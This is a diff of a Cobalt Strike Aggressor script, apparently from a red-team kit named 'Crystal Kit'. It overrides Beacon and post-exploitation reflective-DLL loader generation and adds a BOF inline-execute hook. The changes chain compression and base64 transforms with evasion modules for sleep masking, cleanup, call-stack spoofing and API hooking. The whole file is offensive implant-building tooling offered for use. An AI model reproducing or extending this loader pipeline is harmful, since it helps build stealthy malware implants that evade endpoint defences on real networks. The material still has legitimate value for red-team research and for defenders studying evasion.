@@ -1,48 +1,49 @@
-debug ( 7 );
+debug(7);
 
 import crystalpalace.spec.* from: crystalpalace.jar;
 import java.util.HashMap;
 
 sub print_info {
-   println ( formatDate ( "[HH:mm:ss] " ) . "\cE[Crystal Kit]\o " . $1 );
+   println( formatDate( "[HH:mm:ss] " ) . "\cE[Crystal Kit]\o " . $1 );
 }
 
 set BEACON_RDLL_GENERATE
 {
-    local ( '$beacon $arch $spec_path $spec $cap $final' );
+    local( '$beacon $arch $spec_path $spec $cap $opts $final' );
 
     $beacon = $2;
     $arch   = $3;
 
     if ( $arch eq "x86" )
     {
-        warn ( "Crystal Kit is x64 only" );
+        warn( "Crystal Kit is x64 only" );
         return $null;
     }
 
-    print_info ( "BEACON_RDLL_GENERATE" );
+    print_info( "BEACON_RDLL_GENERATE" );
 
-    $spec_path = getFileProper ( script_resource ( "loader" ), "loader.spec" );
+    $spec_path = getFileProper( script_resource( "loader" ), "loader.spec" );
     $spec      = [ LinkSpec Parse: $spec_path ];
-    $cap       = [ Capability Parse: cast ( $beacon, 'b' ) ];
-    $final     = [ $spec run: $cap, [ new HashMap ] ];
+    $cap       = [ Capability Parse: cast( $beacon, 'b' ) ];
+    
+    $opts = [ new HashMap ];
+    [ $opts put: "%transforms", "../transforms/lznt1/lznt1.spec, ../transforms/base64/base64.spec" ];
+    [ $opts put: "%hooks", "../tradecraft/sleepmask/sleepmask.spec, ../tradecraft/cleanup/cleanup.spec, ../tradecraft/stackspoof/stackspoof.spec" ];
+    
+    $final = [ $spec run: $cap, $opts ];
 
-    if ( strlen ( $final ) == 0 )
+    if ( strlen( $final ) == 0 )
     {
-        warn ( "Failed to build payload" );
+        warn( "Failed to build loader" );
         return $null;
     }
 
     return $final;
 }
 
-set BEACON_RDLL_SIZE {
-   return "0";
-}
-
 set BEACON_RDLL_GENERATE_LOCAL
 {
-    local ( '$beacon $arch $gmh $gpa $spec_path $spec $cap $hash_map $final' );
+    local( '$beacon $arch $gmh $gpa $spec_path $spec $cap $opts $final' );
 
     $beacon = $2;
     $arch   = $3;
@@ -51,26 +52,27 @@ set BEACON_RDLL_GENERATE_LOCAL
 
     if ( $arch eq "x86" )
     {
-        warn ( "Crystal Kit is x64 only" );
+        warn( "Crystal Kit is x64 only" );
         return $null;
     }
 
-    print_info ( "BEACON_RDLL_GENERATE_LOCAL" );
+    print_info( "BEACON_RDLL_GENERATE_LOCAL" );
 
-    $spec_path = getFileProper ( script_resource ( "loader" ), "local-loader.spec" );
+    $spec_path = getFileProper( script_resource( "loader" ), "smart-loader.spec" );
     $spec      = [ LinkSpec Parse: $spec_path ];
-    $cap       = [ Capability Parse: cast ( $beacon, 'b' ) ];
+    $cap       = [ Capability Parse: cast( $beacon, 'b' ) ];
+    
+    $opts = [ new HashMap ];
+    [ $opts put: "\$GMH", cast( $gmh, 'b' ) ];
+    [ $opts put: "\$GPA", cast( $gpa, 'b' ) ];
+    [ $opts put: "%transforms", "../transforms/lznt1/lznt1.spec, ../transforms/base64/base64.spec" ];
+    [ $opts put: "%hooks", "../tradecraft/sleepmask/sleepmask.spec, ../tradecraft/cleanup/cleanup.spec, ../tradecraft/stackspoof/stackspoof.spec" ];
 
-    $hash_map  = [ new HashMap ];
+    $final = [ $spec run: $cap, $opts ];
 
-    [ $hash_map put: "\$GMH", cast ( $gmh, 'b' ) ];
-    [ $hash_map put: "\$GPA", cast ( $gpa, 'b' ) ];
-
-    $final = [ $spec run: $cap, $hash_map ];
-
-    if ( strlen ( $final ) == 0 )
+    if ( strlen( $final ) == 0 )
     {
-        warn ( "Failed to build payload" );
+        warn( "Failed to build local loader" );
         return $null;
     }
 
@@ -79,34 +81,68 @@ set BEACON_RDLL_GENERATE_LOCAL
 
 set POSTEX_RDLL_GENERATE
 { 
-    local ( '$postex $arch $gmh $gpa $spec_path $spec $hash_map $final' );
+    local( '$postex $arch $gmh $gpa $spec_path $spec $cap $opts $final' );
    
-    $postex = $2;
-    $arch   = $3;
-    $gmh    = $5;
-    $gpa    = $6;
+    $postex  = $2;
+    $arch    = $3;
+    $gmh     = $5;
+    $gpa     = $6;
 
     if ( $arch eq "x86" )
     {
-        warn ( "Crystal Kit is x64 only" );
+        warn( "Crystal Kit is x64 only" );
         return $null;
     }
 
-    print_info ( "POSTEX_RDLL_GENERATE" );
+    print_info( "POSTEX_RDLL_GENERATE" );
 
-    $spec_path = getFileProper ( script_resource ( "postex-loader" ), "loader.spec" );
+    $spec_path = getFileProper( script_resource( "loader" ), "postex-loader.spec" );
     $spec      = [ LinkSpec Parse: $spec_path ];
+    $cap       = [ Capability Parse: cast( $postex, 'b' ) ];
+    
+    $opts = [ new HashMap ];
+    [ $opts put: "\$GMH", cast( $gmh, 'b' ) ];
+    [ $opts put: "\$GPA", cast( $gpa, 'b' ) ];
+    [ $opts put: "%transforms", "../transforms/lznt1/lznt1.spec, ../transforms/base64/base64.spec" ];
+    [ $opts put: "%hooks", "../tradecraft/cleanup/cleanup.spec, ../tradecraft/hooker/hooker.spec, ../tradecraft/stackspoof/stackspoof.spec" ];
 
-    $hash_map  = [ new HashMap ];
+    $final = [ $spec run: $cap, $opts ];
 
-    [ $hash_map put: "\$GMH", cast ( $gmh, 'b' ) ];
-    [ $hash_map put: "\$GPA", cast ( $gpa, 'b' ) ];
-
-    $final = [ $spec run: $postex, $hash_map ];
-
-    if ( strlen ( $final ) == 0 )
+    if ( strlen( $final ) == 0 )
     {
-       warn ( "Failed to build package" );
+       warn( "Failed to build postex loader" );
+       return $null;
+    }
+
+    return $final;
+}
+
+set BEACON_INLINE_EXECUTE
+{
+    local( '$bof $spec_path $spec $cap $opts $final' );
+
+    $bof = $1;
+
+    print_info( "BEACON_INLINE_EXECUTE" );
+
+    $spec_path = script_resource( "bofs.spec" );
+    $spec      = [ LinkSpec Parse: $spec_path ];
+    $cap       = [ Capability Parse: cast( $bof, 'b' ) ];
+
+    if ( [ $cap getArch ] eq "x86" )
+    {
+        warn( "Crystal Kit is x64 only" );
+        return $null;
+    }
+    
+    $opts = [ new HashMap ];
+    [ $opts put: "%hooks", "tradecraft/stackspoof/stackspoof.spec" ];
+
+    $final = [ $spec run: $cap, $opts ];
+
+    if ( strlen( $final ) == 0 )
+    {
+       warn( "Failed to merge BOF cocktail" );
        return $null;
     }
 
